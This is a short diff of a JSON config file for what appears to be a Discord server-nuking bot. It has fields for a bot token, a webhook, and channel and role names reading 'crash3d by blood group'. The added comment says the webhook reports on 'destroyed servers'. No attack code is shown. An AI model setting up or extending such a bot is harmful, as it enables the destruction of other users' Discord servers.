@@ -31,7 +31,7 @@
 {
 	"token": "Your bot token",
 	"prefix": "!",
-	"loghook": "",
+	"loghook": "", //The webhook to which information about the destroyed servers will be sent.
 	"developer_list": [],
 	"channels_name": "crash3d by blood group",
 	"roles_name": "crash3d by blood group",
